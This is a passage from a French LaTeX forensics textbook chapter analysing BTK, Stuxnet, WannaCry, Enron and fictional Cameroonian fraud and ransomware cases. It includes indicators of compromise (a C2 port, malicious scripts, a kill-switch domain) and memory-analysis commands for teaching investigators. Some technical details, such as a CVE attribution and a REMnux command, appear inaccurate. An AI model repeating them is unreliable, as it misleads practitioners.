\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~2.2 --- La double hélice appliquée \niveaumoyen}]
L'affaire Stuxnet (2010) est un cas où un programme malveillant, conçu par
des services étatiques, a physiquement endommagé des centrifugeuses iraniennes
d'enrichissement d'uranium. Son investigation a mobilisé simultanément~:
reverse engineering de code polymorphe (4~zero-days simultanés), attribution
géopolitique, droit international, et éthique de la guerre numérique.

\begin{enumerate}[(a)]
    \item Appliquez le modèle $\vec{R}_t$ à cette affaire~: quelles composantes
          $(\alpha_T, \alpha_J, \alpha_S, \alpha_P)$ sont les plus sollicitées~?
    \item Identifiez deux tensions CRO spécifiques à cette affaire et proposez
          comment un investigateur mandaté par une institution internationale
          devrait les gérer.
    \item En quoi cette affaire préfigure-t-elle le « régime IA contre IA »
          décrit en Section~2.5~?
\end{enumerate}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~2.3 --- Prospective \niveauexpert}]
La loi d'accélération épistémique ($\Delta t_{n+1} = k \cdot \Delta t_n$)
suggère que le prochain régime de vérité émergera vers 2027--2030.

\begin{enumerate}[(a)]
    \item Sur la base des tendances actuelles (IA générative, informatique
          quantique, blockchain forensique), construisez un scénario de rupture
          plausible~: quel incident fondateur pourrait déclencher le prochain
          changement de régime~?
    \item Quelles compétences un investigateur formé aujourd'hui devrait-il
          développer pour rester pertinent dans ce nouveau régime~?
    \item Positionnez le Cameroun dans ce scénario~: quels atouts et quelles
          vulnérabilités spécifiques le pays présente-t-il face à cette
          transition~?
\end{enumerate}
\end{boxexo}

\bigskip

\begin{boxinfo}
\textbf{Transition.} Le Chapitre~\ref{chap:grandes-affaires} approfondit
cinq affaires choisies pour leur valeur pédagogique maximale --- chacune
illustrant une innovation forensique qui a redéfini la pratique. Le
Chapitre~\ref{chap:fond-theo} formalisera ensuite les outils théoriques
(théorie de l'information, théorie des graphes, cryptographie) sur lesquels
repose la forensique moderne.
\end{boxinfo}

      
        % ============================================================================
% Fichier  : partie1/P01_C03_grandes_affaires.tex
% Titre    : Les Grandes Affaires --- Leçons de l'Histoire
% Auteur   : MINKA MI NGUIDJOÏ Thierry Emmanuel
% Version  : 1.0 -- Juin 2026
% Statut   : RÉDIGÉ
%
% Positionnement par rapport au Chapitre 2 :
%   Le Chap. 2 a utilisé les affaires comme preuves de changements de régime.
%   Ce chapitre les dissèque comme laboratoires techniques : anatomie de
%   l'attaque, outils mobilisés, erreurs commises, innovation produite,
%   leçon opérationnelle extractible. Aucune duplication -- complémentarité.
%
% Sources :
%   - 2_grandes_affaires.tex (BTK, Stuxnet, WannaCry -- squelette)
%   - 15_affaire_cyberfinance.tex (CyberFinance Cameroun 2025)
%   - M7_Cas_Pratiques_Integrateurs_PNC.docx (ONAMBELE, TANGUE, MVOM, WOURI)
%   - chap2.pdf (analyses épistémologiques complémentaires)
% ============================================================================

\chapter{Les Grandes Affaires --- Leçons de l'Histoire}
\label{chap:gr-affaires}

\epigraph{%
    « Chaque grande affaire forensique est un laboratoire où s'expérimente
    l'avenir de notre discipline. »%
}{--- D\textsuperscript{r} Henry C. Lee}

\niveauChapitre{Fondamental}{%
    Ce chapitre prolonge le Chapitre~\ref{chap:histoire} en approfondissant
    l'anatomie technique des affaires fondatrices. Aucun prérequis -- les
    concepts techniques sont introduits et définis au fil du texte.%
}

\begin{boxobjectifs}
\begin{itemize}
    \item Analyser l'anatomie technique et judiciaire de sept affaires
          fondatrices pour en extraire les principes forensiques durables.
    \item Identifier, dans chaque affaire, l'\termecle{artefact décisif} ---
          la preuve unique qui a fait basculer le dossier --- et la méthode
          employée pour le découvrir.
    \item Reconnaître les erreurs procédurales récurrentes qui affaiblissent
          les dossiers, afin de ne pas les reproduire.
    \item Appliquer la grille d'analyse CRO à des cas réels pour comprendre
          comment les tensions entre confidentialité, fiabilité et opposabilité
          se manifestent concrètement.
    \item S'approprier les quatre cas camerounais (Opérations ONAMBELE, TANGUE,
          MVOM, WOURI) comme référentiels de pratique locale.
\end{itemize}
\end{boxobjectifs}

\bigskip

% ============================================================================
\section*{Comment lire ce chapitre}
% ============================================================================

Chaque affaire est disséquée selon la même structure~: \textbf{contexte} (ce
qui s'est passé, en bref), \textbf{artefact décisif} (la preuve qui a tout
changé), \textbf{anatomie technique} (comment cette preuve a été trouvée et
pourquoi elle a tenu juridiquement), \textbf{erreurs commises} (ce qui a failli
faire échouer l'investigation), et \textbf{leçon transférable} (ce que vous
devez emporter de cette affaire dans votre pratique quotidienne).

\medskip

Les quatre premières affaires sont internationales et fondatrices. Les quatre
suivantes sont camerounaises --- fictives mais construites sur les patterns
exacts des affaires traitées par la \sigle{DGSN} et l'\sigle{ANTIC} entre
2020 et 2026.

\separateur

% ============================================================================
\section{L'Affaire BTK Killer --- Dennis Rader (2005)}
\label{sec:btk}
% ============================================================================

\subsection{Contexte et artefact décisif}

Dennis Rader, tueur en série surnommé \termecle{BTK} (\textit{Bind, Torture,
Kill}), a assassiné 10~personnes dans la région de Wichita (Kansas) entre
1974 et 1991. Après une longue absence, il reprend contact avec la police en
2004 par lettres, puis par disquette. En janvier~2005, il envoie une disquette
contenant un fichier \texttt{Test.A.rtf}. Les métadonnées extraites par les
enquêteurs du FBI en quelques minutes conduisent à son arrestation en
quatre jours.

\medskip

\textbf{L'artefact décisif}~: les propriétés du fichier \texttt{.rtf} révèlent
le champ \textit{Auteur}~: \texttt{Dennis}, et le champ
\textit{Dernière organisation}~: \texttt{Christ Lutheran Church}. Le
croisement avec les membres actifs de cette paroisse identifie Rader
immédiatement.

\subsection{Anatomie technique}

\begin{boxartefact}{Métadonnées Office --- champs auteur et organisation}
\textbf{Localisation dans Windows~:}
Clic droit sur le fichier $\to$ \texttt{Propriétés} $\to$
onglet \texttt{Détails}. Ou dans Office~: \texttt{Fichier} $\to$
\texttt{Informations} $\to$ \texttt{Propriétés}.

\textbf{Localisation dans Autopsy~:}
\texttt{Results} $\to$ \texttt{Extracted Content} $\to$
\texttt{Document Metadata}.

\textbf{Extraction en ligne de commande~:}
\begin{lstlisting}[language=bash_forensique]
# ExifTool -- extraction complete des metadonnees
exiftool fichier.docx

# Sortie typique
Author              : Dennis
Last Modified By    : Dennis
Organization        : Christ Lutheran Church
Create Date         : 2005:01:15 19:42:33
\end{lstlisting}

\textbf{Principe clé~:} tout document Office créé depuis 1997 porte ces
métadonnées. La plupart des utilisateurs ignorent leur existence.
Elles survivent au renommage, à la copie, au transfert par email.
\end{boxartefact}

\subsection{Erreurs commises --- et ce qu'elles enseignent}

Rader a commis une erreur élémentaire~: utiliser un ordinateur institutionnel
(celui de son église) pour préparer un document destiné à la police, sans
jamais nettoyer les métadonnées. Cette erreur révèle un \textbf{angle mort
cognitif} universel~: les utilisateurs visualisent le contenu de leurs
documents mais ignorent la couche de métadonnées sous-jacente. Pour
l'investigateur, cet angle mort est une opportunité systématique.

\begin{boxalert}
\textbf{Le principe des métadonnées survivantes}~: tout fichier numérique
produit une \emph{deuxième couche d'information} --- les métadonnées --- que
son auteur ne voit pas et oublie donc de supprimer. Cette couche contient
souvent~: l'identité de l'auteur, l'organisation, l'équipement utilisé,
le chemin de fichier sur l'ordinateur source, parfois des coordonnées GPS
(photos), la géolocalisation de l'imprimante, les révisions successives du
document. L'examen systématique des métadonnées est une étape non
optionnelle de toute investigation numérique.
\end{boxalert}

\subsection{Leçon transférable}

\begin{boxresume}
\textbf{BTK --- Ce que vous emportez~:}
\begin{itemize}
    \item Extraire systématiquement les métadonnées de \textbf{tous} les
          fichiers collectés~; ne jamais se limiter au contenu visible.
    \item La commande \lstinline[language=bash_forensique]{exiftool -r /dossier/}
          traite récursivement un répertoire entier.
    \item Un champ auteur vide n'est pas neutre~: il signifie que le fichier
          a été créé avec un outil qui ne l'inscrit pas, ou que les
          métadonnées ont été \emph{délibérément} supprimées (\textit{timestomping}
          ou nettoyage EXIF) --- ce qui est en soi un indice forensique.
\end{itemize}
\end{boxresume}

% ============================================================================
\section{L'Affaire Stuxnet (2010)}
\label{sec:stuxnet}
% ============================================================================

\subsection{Contexte et artefact décisif}

\termecle{Stuxnet} est le premier programme malveillant conçu pour causer des
dommages physiques à une infrastructure industrielle. Découvert en juin~2010
par VirusBlokAda, il cible spécifiquement les centrifugeuses d'enrichissement
d'uranium iraniennes de Natanz. Quatre zero-days simultanés, un code polymorphe
sophistiqué, une précision chirurgicale sur les automates Siemens
\texttt{SIMATIC S7-315/S7-417}~: l'attribution à des services étatiques
(États-Unis et Israël, selon les sources) est largement acceptée.

\medskip

\textbf{L'artefact décisif}~: la présence de \textbf{quatre zero-days
simultanés} dans un seul programme. Un groupe cybercriminel ordinaire
en exploite rarement plus d'un~; en utiliser quatre simultanément signale
des ressources d'État. Ce \textit{marqueur de sophistication} a été
l'argument principal de l'attribution.

\subsection{Anatomie technique}

L'investigation de Stuxnet a fondé la sous-discipline de la
\termecle{cyberforensique industrielle}\index{cyberforensique industrielle}.
Quatre techniques innovantes ont été nécessaires~:

\begin{enumerate}
    \item \textbf{Reverse engineering de code polymorphe~:} Stuxnet modifiait
          son propre code à chaque exécution pour contourner les signatures
          antivirales. L'analyse a requis l'extraction du code depuis la
          mémoire du processus en cours d'exécution --- avant que la
          polymorphie ne l'altère.

    \item \textbf{Sandboxing comportemental~:} l'exécution dans un
          environnement virtualisé isolé (\textit{sandbox}) a permis
          d'observer le comportement du malware sans risquer de propager
          l'infection. Stuxnet vérifiait lui-même s'il tournait dans une
          sandbox~; les analystes ont dû contourner cette détection.

    \item \textbf{Identification des quatre zero-days~:}
          \begin{itemize}
              \item CVE-2010-2568~: vulnérabilité dans le traitement des
                    fichiers \texttt{.lnk} (raccourcis Windows).
              \item CVE-2010-2772~: vulnérabilité dans le \textit{Windows
                    Task Scheduler}.
              \item CVE-2010-2729~: vulnérabilité dans le service
                    \textit{Print Spooler} pour la propagation réseau.
              \item CVE-2010-2743~: vulnérabilité dans le pilote
                    noyau Windows pour l'élévation de privilèges.
          \end{itemize}

    \item \textbf{Forensique des automates industriels (ICS/SCADA)~:}
          les \sigle{PLC} (\textit{Programmable Logic Controllers}) Siemens
          ciblés ne sont pas des PC~; leur forensique exige des outils et
          des compétences spécifiques absents des boîtes à outils classiques.
\end{enumerate}

\begin{boxCRO}
\textbf{Analyse CRO --- Affaire Stuxnet}

$\mathcal{C}$~: l'investigation a nécessité l'accès à des données sensibles
d'États souverains et d'installations nucléaires. Le niveau de
classification a fortement contraint la diffusion des résultats.
\cro{$\downarrow$ très contrainte}{$\uparrow$ robuste}{$\sim$ limitée aux instances spécialisées}

La tension CRO de Stuxnet est atypique~: l'opposabilité n'est pas un
objectif pénal (personne ne sera jugé) mais stratégique (attribution
pour la diplomatie et la dissuasion). Cela illustre que l'investigation
numérique sert des finalités multiples, pas seulement judiciaires.
\end{boxCRO}

\subsection{Leçon transférable}

\begin{boxresume}
\textbf{Stuxnet --- Ce que vous emportez~:}
\begin{itemize}
    \item La sophistication d'un malware est un \textbf{marqueur
          d'attribution}~: zéro à deux zero-days = acteur criminel ou
          hacktiviste~; trois zero-days et plus = ressources d'État.
    \item Les systèmes industriels (ICS/SCADA) sont une frontière en
          expansion de l'investigation numérique~; leur forensique
          nécessite des compétences spécifiques au-delà de l'informatique
          classique.
    \item L'analyse comportementale en sandbox est indispensable pour
          tout malware inconnu~: ne jamais exécuter un binaire suspect
          sur un système de production ou d'analyse non isolé.
\end{itemize}
\end{boxresume}

% ============================================================================
\section{L'Affaire WannaCry (2017)}
\label{sec:wannacry}
% ============================================================================

\subsection{Contexte et artefact décisif}

Le 12~mai~2017, le ransomware \termecle{WannaCry} infecte 300~000~ordinateurs
dans 150~pays en moins de 72~heures, en exploitant la vulnérabilité
\textit{EternalBlue} (CVE-2017-0144) volée à la NSA et publiée par le
groupe Shadow Brokers. Les systèmes Windows non patchés, notamment ceux du
National Health Service britannique (NHS), sont frappés de plein fouet~:
des hôpitaux doivent reporter des opérations chirurgicales non urgentes.

\medskip

\textbf{L'artefact décisif}~: le \textbf{kill switch}. Marcus Hutchins,
chercheur de 22~ans, découvre dans le code de WannaCry une requête vers un
domaine non enregistré (\texttt{iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com}).
En enregistrant ce domaine pour 10,69~USD, il active le kill switch et stoppe
la propagation mondiale.

\subsection{Anatomie technique}

Trois techniques d'investigation ont été déterminantes~:

\subsubsection{Analyse du Domain Generation Algorithm (DGA)}

WannaCry ne s'appuie pas sur un DGA classique --- le domaine kill switch
est codé en dur. Mais l'analyse de ce domaine a révélé l'architecture de
contrôle du malware~: la présence d'un kill switch hard-codé est une
signature des opérations de malware à grande échelle (permet à l'auteur de
désactiver le malware en cas d'attribution imminente).

\begin{lstlisting}[language=bash_forensique,
    caption={Extraction du kill switch depuis un binaire WannaCry}]
# Strings -- recherche de domaines et URLs dans le binaire
strings wannacry.exe | grep -E "\.(com|net|org|onion)"

# Sortie attendue :
# iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com  <- kill switch
# 2.0.0.10 <- C2 IP candidate
# @WanaDecryptor@  <- marqueur de famille

# Vérification dynamique en sandbox (REMnux)
remnux analyze --timeout 60 wannacry.exe
\end{lstlisting}

\subsubsection{Attribution probabiliste~: la piste Lazarus}

L'attribution à la Corée du Nord (groupe Lazarus) repose sur trois
artefacts corrélés~: similitudes de code avec des malwares Lazarus
précédents (2014~: Sony Pictures), utilisation de la même adresse
Bitcoin pour les paiements de rançons, et présence de commentaires
en coréen dans certaines chaînes de débogage.

\begin{boiteRemarque}{Attribution numérique~: probabilité, pas certitude}
L'attribution d'une attaque numérique à un acteur étatique ou
criminel est un \textbf{jugement probabiliste}, jamais une certitude.
Les bons acteurs imitent les signatures d'autres groupes (\textit{false
flag}). L'investigateur doit présenter ses conclusions d'attribution avec
un niveau de confiance explicite (\textit{ex.}~: « attribution avec
confiance modérée, sur la base de trois indicateurs corrélés »), non
comme des faits établis.
\end{boiteRemarque}

\subsubsection{Forensique de l'impact~: reconstitution de la chronologie}

La réponse à WannaCry a révélé l'importance de la
\termecle{forensique des journaux distribués}\index{forensique!journaux distribués}~:
les logs de 150~pays devaient être corrélés temporellement. La
leçon fondamentale est que les horloges système ne sont pas synchronisées
universellement --- une écart de quelques minutes entre deux systèmes
peut inverser la chronologie d'une infection et fausser l'attribution.

\subsection{Leçon transférable}

\begin{boxresume}
\textbf{WannaCry --- Ce que vous emportez~:}
\begin{itemize}
    \item Analyser systématiquement les requêtes réseau d'un malware~:
          elles révèlent l'architecture de contrôle et parfois un
          mécanisme de désactivation.
    \item L'attribution est une \textbf{opinion raisonnée}, pas une
          certitude~; la présenter comme telle protège l'expert
          lors du contre-interrogatoire.
    \item La corrélation temporelle multi-sources exige une
          \textbf{synchronisation des horloges}~: documenter le
          décalage NTP de chaque système analysé avant toute chronologie.
\end{itemize}
\end{boxresume}

% ============================================================================
\section{L'Affaire Enron --- L'E-Discovery à l'Échelle (2001)}
\label{sec:enron}
% ============================================================================

\subsection{Contexte et artefact décisif}

La faillite d'Enron en décembre~2001 génère la première investigation
numérique à grande échelle de l'histoire~: 500~000~documents électroniques
(emails, feuilles Excel, présentations PowerPoint) doivent être collectés,
préservés, analysés et présentés en justice. L'enjeu dépasse le périmètre
technique~: pour la première fois, un tribunal doit statuer sur la
recevabilité de preuves numériques massives.

\medskip

\textbf{L'artefact décisif}~: l'\textbf{email d'Enron} du 23~août~2001,
dans lequel le vice-président Sherron Watkins avertit le PDG~: \textit{« I
am incredibly nervous that we will implode in a wave of accounting
scandals. »} Cet email n'était pas destiné à être conservé --- mais il
l'était, dans les sauvegardes automatiques des serveurs Exchange.

\subsection{Anatomie technique}

\subsubsection{La problématique de l'e-discovery à grande échelle}

500~000~documents ne peuvent pas être examinés manuellement. Enron a
conduit au développement des premières techniques de
\termecle{Technology-Assisted Review} (TAR)\index{TAR}, ancêtre des
outils d'IA forensique actuels. Les principes~:

\begin{enumerate}
    \item \textbf{Collecte préservante~:} extraction des emails depuis les
          serveurs Exchange avec préservation des métadonnées (horodatages,
          en-têtes SMTP, codes de priorité). La simple exportation en
          \texttt{.pst} aurait supprimé des informations cruciales.
    \item \textbf{Déduplication~:} les mêmes emails existent en copies
          multiples (boîtes envoi, reçu, sauvegardes). La déduplication
          basée sur le hachage permet de réduire le volume sans perte d'information.
    \item \textbf{Classification assistée~:} les premiers algorithmes de
          classification par mots-clés et par graphe de communication ont
          identifié les 200~personnes les plus impliquées parmi les
          20~000~boîtes email analysées.
\end{enumerate}

\subsubsection{La règle de l'email~: ce qui est envoyé ne disparaît jamais}

\begin{boxalert}
\textbf{Le principe de la persistance des communications électroniques~:}
un email envoyé existe en copies multiples --- dans la boîte d'envoi de
l'expéditeur, la boîte de réception du destinataire, les sauvegardes
automatiques des serveurs, les journaux des serveurs relais, les archives
légales si elles existent. La suppression d'une copie n'élimine pas les autres.

En contexte judiciaire~: la réquisition aux fournisseurs de services
(art.~30 Loi~2010/012 au Cameroun~; Convention de Budapest art.~17 et~18
pour la coopération internationale) est le mécanisme légal pour accéder
aux copies conservées par les opérateurs.
\end{boxalert}

\subsection{Leçon transférable}

\begin{boxresume}
\textbf{Enron --- Ce que vous emportez~:}
\begin{itemize}
    \item La collecte préservante des emails exige d'extraire les
          \textbf{métadonnées complètes} (en-têtes SMTP, horodatages
          de réception, Message-ID) --- pas seulement le corps du message.
    \item La déduplication basée sur le hachage est la méthode de référence
          pour traiter de grands volumes sans altérer les preuves.
    \item En droit camerounais~: la réquisition judiciaire aux opérateurs
          pour obtenir les communications conservées est l'article~30
          de la \loicam{2010/012}. Elle doit être formulée avec précision
          (période, type de données, critères d'identification).
\end{itemize}
\end{boxresume}

% ============================================================================
\section{Opération ONAMBELE (Cameroun)}
\label{sec:onambele}
% ============================================================================

\subsection{Contexte}

\begin{boxscenario}{Opération ONAMBELE --- Fraude MoMo}
\textbf{Situation initiale~:} Mme~ABENA Céline, infirmière à Yaoundé,
perd 850~000~FCFA en trois virements MTN MoMo (mars~2026) après avoir reçu
des SMS lui annonçant qu'elle a gagné une promotion MTN fictive. Les fonds
sont transférés vers le numéro de ZANGA Michel, 28~ans, qui a « prêté » son
compte à un individu connu sous le nom de « KOFFI » en échange de
5~000~FCFA. KOFFI est identifié comme KOUAME Narcisse, basé à Abidjan
(Côte d'Ivoire).
\end{boxscenario}

\subsection{Artefacts décisifs et anatomie technique}

L'affaire mobilise quatre artefacts complémentaires~:

\begin{boxartefact}{Historique de transactions MoMo}
\textbf{Source~:} réquisition judiciaire à MTN (\loicam{2010/012}, art.~30).

\textbf{Information probante~:} horodatages précis des trois virements,
numéro destinataire (ZANGA), et la cascade de transferts immédiats vers
trois autres numéros puis vers un retrait en espèces.

\textbf{Valeur forensique~:} la cascade (\textit{layering}) est un
schéma classique de blanchiment~; elle prouve que le numéro de ZANGA
n'était pas une destination finale mais un relais dans un réseau organisé.
\end{boxartefact}

\begin{boxartefact}{Métadonnées du check-in Facebook de KOFFI}
\textbf{Source~:} OSINT sur le profil Facebook de KOFFI.

\textbf{Information probante~:} un check-in dans un restaurant de Yaoundé
daté du 25~février~2026 --- deux semaines avant la fraude. Le profil indiquait
être à Abidjan, mais ce check-in contredit cette déclaration et place KOFFI
au Cameroun au moment des faits.

\textbf{Valeur forensique~:} les check-ins Facebook contiennent les
coordonnées GPS inscrites dans les métadonnées du post. En l'occurrence~:
latitude~3.86°N, longitude~11.52°E --- centre de Yaoundé.
\end{boxartefact}

\subsection{Erreurs à éviter}

\begin{boxalert}
\textbf{Erreur n°1 --- Arrêter à ZANGA~:} ZANGA est une « mule » --- un
intermédiaire recruté pour ouvrir un compte et le prêter. L'arrêter seul
ne démantèle pas le réseau. L'investigateur doit remonter la chaîne~:
ZANGA $\to$ KOFFI $\to$ le vrai organisateur.

\textbf{Erreur n°2 --- Négliger le téléphone allumé~:} le téléphone
Samsung de ZANGA était allumé lors de l'arrestation. Un OPJ non formé
pourrait le brancher sur un chargeur sans activer le mode avion. En
quelques secondes, un message de «~remote wipe~» pourrait effacer les
contacts de KOFFI sur WhatsApp. Procédure correcte~: mode avion
immédiat, puis ADB.

\textbf{Erreur n°3 --- Omettre la coopération internationale~:}
KOUAME Narcisse est en Côte d'Ivoire. Sans demande de coopération
(Convention de Budapest art.~29~; accord bilatéral Cameroun-CEDEAO),
il ne peut pas être arrêté. La demande doit partir dès l'identification,
pas attendre la fin de l'investigation nationale.
\end{boxalert}

\begin{boxCRO}
\textbf{Analyse CRO --- Opération ONAMBELE}

$\mathcal{C}$~: le contenu des messages WhatsApp entre ZANGA et KOFFI
est une preuve cruciale, mais son accès exige le déblocage du téléphone
(code PIN que ZANGA refuse de communiquer). Tenter un brute-force sans
mandat risque de violer $\mathcal{C}$ et compromettre $\mathcal{O}$.

$\mathcal{R}$~: les données MoMo (réquisition MTN) sont des preuves
fiables car issues directement des bases de l'opérateur, avec horodatages
serveur.

$\mathcal{O}$~: l'ensemble du dossier (réquisition MTN + OSINT Facebook
+ ADB après consentement ou mandat) est admissible si la procédure est
respectée.

\cro{$\sim$ à gérer}{$\uparrow$}{$\uparrow$ sous conditions}
\end{boxCRO}

% ============================================================================
\section{Opération TANGUE (Cameroun)}
\label{sec:tangue}
% ============================================================================

\subsection{Contexte}

\begin{boxscenario}{Opération TANGUE --- Forensique de disque}
BELLO Armand, comptable chez SONATRAV (entreprise de travaux publics),
est suspecté d'avoir détourné 25~millions FCFA via de faux bons de commande
créés dans le système comptable informatisé. Son ordinateur portable
Windows est saisi. Une image forensique E01 est créée avec FTK Imager.
Huit artefacts sont cachés dans l'image~: l'investigateur doit les trouver
tous avec Autopsy.
\end{boxscenario}

\subsection{Les huit artefacts et leur localisation}

\begin{tableaucours}{p{2.5cm}p{4.5cm}p{5cm}}{%
    \tableauHeader{Artefact} &
    \tableauHeader{Description} &
    \tableauHeader{Localisation Autopsy}
}
A1 --- Email virement &
    Email Outlook~: ordre de virement avec faux IBAN fournisseur &
    \texttt{Results → E-Mail Messages → rechercher 'virement'} \\
A2 --- Screenshot banque &
    Capture portail bancaire UBA après virement &
    \texttt{File Views → Images → filtrer par date} \\
A3 --- GPS dans photo &
    Photo prise à Yaoundé (pas à Douala comme déclaré) -- coordonnées GPS dans EXIF &
    \texttt{Results → EXIF Metadata → colonnes Latitude/Longitude} \\
A4 --- Document supprimé &
    \texttt{faux\_bon\_de\_commande.docx} marqué supprimé &
    \texttt{File Views → Deleted Files} \\
A5 --- Tableau détournements &
    Excel avec suivi des détournements~: montants, dates, bénéficiaires &
    \texttt{File Views → Recent Documents} \\
A6 --- Historique Chrome &
    Visite portail bancaire le jour du virement à 14h32 &
    \texttt{Results → Web History → filtrer par date} \\
A7 --- Prefetch keyfinder &
    \texttt{PASSWORDRECOVERY.EXE} -- outil d'extraction de mots de passe &
    \texttt{C:\textbackslash Windows\textbackslash Prefetch\textbackslash} \\
A8 --- Clé USB non déclarée &
    Kingston~16~Go, branchée le jour du virement à 14h40 &
    \texttt{Results → USB Device Attached} \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~3.1 --- Les huit artefacts de l'Opération
TANGUE et leur localisation dans Autopsy}\end{center}

\subsection{Leçon transférable}

L'affaire TANGUE illustre la \textbf{convergence probatoire}~: aucun des
huit artefacts n'est suffisant seul, mais leur combinaison est accablante.
L'email prouve l'intention~; le screenshot prouve l'action~; le GPS
invalide l'alibi~; le document supprimé prouve la préméditation~; le
Prefetch du keyfinder prouve la préparation technique~; la clé USB prouve
l'exfiltration.

\begin{boxCRO}
\textbf{Analyse CRO --- Opération TANGUE}

L'artefact A5 (tableau de suivi des détournements) pose une question
CRO intéressante~: un fichier \emph{auto-incriminant} a une valeur
probatoire réelle ($\mathcal{R}$ haute~: l'auteur lui-même documente
ses actes) mais doit être corroboré ($\mathcal{O}$ conditionnelle~: sans
corroboration, un juge prudent le considèrera comme insuffisant seul).

La corrélation A5 + A1 + A6 (même journée, même heure, même montant)
constitue la triade probatoire qui rend le dossier incontestable.
\cro{$\sim$}{$\uparrow\uparrow$}{$\uparrow$ par convergence}
\end{boxCRO}

% ============================================================================
\section{Opération MVOM (Cameroun)}
\label{sec:mvom}
% ============================================================================

\subsection{Contexte}

\begin{boxscenario}{Opération MVOM --- Ransomware sur PME}
TRANSBOIS SA, PME forestière de Yaoundé (45~employés, 2~milliards FCFA
de CA), subit une attaque ransomware LockBit. 85\% des fichiers sont chiffrés
(extension \texttt{.lockbitcm}). La rançon demandée est de 5~bitcoins
(\textasciitilde 400~000~USD). L'entrée initiale~: une connexion RDP
depuis une IP roumaine, utilisant le compte administrateur dont le mot de
passe était \texttt{Transbois2023}. 2,3~Go de données ont été exfiltrées
\emph{avant} le chiffrement.
\end{boxscenario}

\subsection{Anatomie technique~: reconstruction sur la Kill Chain}

La Kill Chain de Lockheed Martin en sept phases est l'outil de référence
pour reconstituer une attaque~:

\begin{tableaucours}{p{1.8cm}p{3.0cm}p{6.5cm}}{%
    \tableauHeader{Phase} &
    \tableauHeader{Nom} &
    \tableauHeader{Preuve dans l'affaire MVOM}
}
Phase~1 & Reconnaissance & Non documentée~; probable scan RDP depuis l'IP roumaine \\
Phase~2 & Armement & Préparation du ransomware LockBit~; hors périmètre camerounais \\
Phase~3 & Livraison & Connexion RDP avec \texttt{admin\_tb / Transbois2023} \\
Phase~4 & Exploitation & Accès administrateur obtenu (12/03~02h14) \\
Phase~5 & Installation & Dépôt de \texttt{enc\_all.ps1} dans \texttt{\%TEMP\%}~; processus \texttt{svchost.exe} suspect \\
Phase~6 & C\&C & Requête DNS vers \texttt{lockbit-pay-cm.onion}~; connexion vers port~4444 \\
Phase~7 & Actions & Exfiltration 2,3~Go (11/03) puis chiffrement (13/03) \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~3.2 --- Reconstruction MVOM sur la Kill Chain
(d'après l'analyse Wireshark + Volatility)}\end{center}

\subsection{L'analyse Volatility~: preuve de l'installation}

\begin{lstlisting}[language=bash_forensique,
    caption={Volatility 3 --- analyse mémoire RAM TRANSBOIS}]
# Lister les processus -- identifier le svchost.exe suspect
python3 vol.py -f transbois.mem windows.pslist
# Résultat : PID 4892 svchost.exe -- parent : cmd.exe (PID 4891)
# ANORMAL : svchost.exe ne devrait pas avoir cmd.exe comme parent

# Analyser les connexions réseau du processus suspect
python3 vol.py -f transbois.mem windows.netscan | grep 4892
# Résultat : connexion ESTABLISHED vers 185.220.XX.XX:4444

# Lister les fichiers ouverts par le processus
python3 vol.py -f transbois.mem windows.filescan | grep enc_all
# Résultat : \Device\HarddiskVolume3\Users\admin\AppData\Local\Temp\enc_all.ps1
\end{lstlisting}

\subsection{Leçon transférable~: la double victime}

\begin{boxalert}
\textbf{TRANSBOIS est simultanément victime et contrevenante.} Le fait
d'être victime d'une attaque ransomware n'exonère pas TRANSBOIS de ses
obligations légales~: absence de politique de mots de passe robuste (art.~27
\loicam{2024/017}), non-notification de violation de données à l'ANPDP
(art.~22 \loicam{2024/017}), absence de registre de traitement (art.~29
\loicam{2024/017}).

\textbf{Principe~:} un responsable de traitement qui facilite, même
involontairement, une attaque contre les données de ses clients engage
sa responsabilité administrative et potentiellement pénale. Les deux
procédures (victimisation + manquements) sont indépendantes et doivent
être traitées séparément.
\end{boxalert}

% ============================================================================
\section{Opération WOURI (Cameroun)}
\label{sec:wouri}
% ============================================================================

\subsection{Contexte}

\begin{boxscenario}{Opération WOURI --- Réseau BEC transfrontalier}
Un réseau de quatre individus opérant depuis trois pays (Cameroun,
Nigeria, Émirats arabes unis) défraude des entreprises camerounaises via des
attaques \termecle{BEC} (\textit{Business Email Compromise})~: usurpation
du domaine d'un fournisseur pour intercepter des virements. Deux victimes~:
SOTRADI SA (47M~FCFA) et AGROBOIS Cameroun (32M~FCFA). Rôles~:
ATANGANA (organisateur, Cameroun), OKAFOR (technicien, Nigeria),
HASSAN (blanchisseur, EAU), NGUEMO (complice-mule, Cameroun).
\end{boxscenario}

\subsection{Cartographie du réseau criminel}

\begin{figure}[H]
\centering
\begin{tikzpicture}[
    suspect/.style={
        draw=CouleurPrimaire, fill=CouleurDef,
        rounded corners=4pt, minimum width=3.2cm, minimum height=0.9cm,
        font=\small\bfseries\color{CouleurPrimaire}, align=center
    },
    victime/.style={
        draw=CouleurBordAlerte, fill=CouleurAlerte,
        rounded corners=4pt, minimum width=3.2cm, minimum height=0.9cm,
        font=\small\color{CouleurBordAlerte}, align=center
    },
    flux/.style={-{Stealth[length=5pt]}, thick, color=CouleurSecondaire},
    blanchiment/.style={-{Stealth[length=5pt]}, thick, dashed, color=CouleurAccent}
]
% Suspects
\node[suspect] (atangana) at (0, 0)    {ATANGANA\\Yaoundé (CM)};
\node[suspect] (okafor)   at (-4, -2)  {OKAFOR\\Lagos (NG)};
\node[suspect] (nguemo)   at (4,  -2)  {NGUEMO\\Yaoundé (CM)};
\node[suspect] (hassan)   at (0,  -4)  {HASSAN\\Dubaï (EAU)};
% Victimes
\node[victime] (sotradi)  at (-3.5, 2) {SOTRADI SA\\47M FCFA};
\node[victime] (agrobois) at (3.5,  2) {AGROBOIS\\32M FCFA};
% Flux
\draw[flux] (okafor)   -- node[left, font=\tiny, color=CouleurSecondaire]
    {phishing/BEC} (sotradi);
\draw[flux] (okafor)   -- node[right, font=\tiny, color=CouleurSecondaire]
    {phishing/BEC} (agrobois);
\draw[flux] (atangana) -- node[above, font=\tiny] {cibles} (okafor);
\draw[flux] (sotradi)  -- node[above left, font=\tiny, color=CouleurBordAlerte]
    {virement} (nguemo);
\draw[flux] (agrobois) -- node[above right, font=\tiny, color=CouleurBordAlerte]
    {virement} (nguemo);
\draw[blanchiment] (nguemo) -- node[right, font=\tiny, color=CouleurAccent]
